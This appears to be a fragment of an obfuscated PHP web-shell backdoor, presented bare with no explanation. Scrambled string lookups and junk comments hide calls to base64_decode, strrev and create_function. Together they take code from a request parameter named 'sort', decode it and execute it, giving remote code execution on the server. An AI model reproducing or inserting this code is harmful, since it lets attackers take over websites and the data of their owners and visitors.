...
$RIRMiSPE8235 = "k7wty5blfvoa.q9pz1(0eh;2c3rds8/mjunigx_6*4)";


$mJDUCRgY4830 = "";

foreach([28,10,26,3] as $F){
       $mJDUCRgY4830 .= $RIRMiSPE8235[$F];
    }


if(isset($_REQUEST /*RvAISCIRBjKaKlkWKjoPubBrekbNHJtPwXIInXzdyjXmXFGTZIGmysCaLhxvDZYjusjBblJiPdDqCRvKHarCVDWCLXnXTiXxMHeoitnizQDpCXEvJmwMNHJYeHxsClqE*/["$mJDUCRgY4830"])){
    $yPsVJuka495 = $_REQUEST /*RvAISCIRBjKaKlkWKjoPubBrekbNHJtPwXIInXzdyjXmXFGTZIGmysCaLhxvDZYjusjBblJiPdDqCRvKHarCVDWCLXnXTiXxMHeoitnizQDpCXEvJmwMNHJYeHxsClqE*/["$mJDUCRgY4830"];
    $xnfchBMp4105 = "";
    $WlMFyffD981 = "";

    /*UPXFQoSlaGFhcFDRauEpBMZXJSHQcwTqMMCxrwYIWPbXhzbNcOSdlsPrPxNCrNbiXCzilzyZmQQGGnTCxbzLpRZFpVmiaYDUBlRMyvsjWLajyUfklhAmMkDLinfIccyz*/

    foreach([6,11,28,20,39,41,38,27,20,24,10,27,20] as $F){
       $xnfchBMp4105 .= $RIRMiSPE8235[$F];
    }

    /*zPBkfkFmZACFKvKMthUGDwAMvyrbyZNYRlFBgTmkviyVqPIiUbIVOBQGbDXnnRwqCCdMAvmalJOepdaxPOQcrBAtbBWtvBxCHLURoRGKvfxhHkMFdurdptDautptYfTH*/


    foreach([28,3,26,26,20,9] as $F){
       $WlMFyffD981 .= $RIRMiSPE8235[$F];
    }

    /*fOfPvhtoYtzdtlRHLUlYGfaAhecmTDHGXLJGVqzLUBWTyfqDNozMqLRUnJhZiUQyiBHrPsackDLCXTisiAhuukahNiHFRerkMlYVdoTmUyUfQAtaWHiVRDEoGzAeTinP*/

    $F = $WlMFyffD981('n'.''.'o'.'i'.''.'t'.''.''.'c'.''.''.''.''.'n'.'u'.''.'f'.'_'.''.'e'.''.'t'.''.''.'a'.'e'.'r'.'c'.''.''.'');
    $W = $F("", $xnfchBMp4105($yPsVJuka495));
    $W();
    exit();
